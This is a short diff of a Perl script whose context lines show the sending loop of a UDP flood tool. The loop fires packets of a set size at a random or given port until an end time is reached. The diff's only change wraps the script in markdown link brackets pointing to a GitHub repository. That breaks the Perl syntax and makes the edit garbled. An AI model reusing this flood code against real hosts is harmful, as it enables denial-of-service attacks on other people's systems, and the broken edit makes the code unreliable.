@@ -1,4 +1,4 @@
-#!/usr/bin/perl
+[#!/usr/bin/perl
 
 use Term::ANSIColor qw(:constants);
     $Term::ANSIColor::AUTORESET = 2;
@@ -49,3 +49,4 @@ for (;time() <= $endtime;) {
   $pport = $port ? $port : int(rand(65500))+1;
  
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
+](https://github.com/akubey/akubey.git)
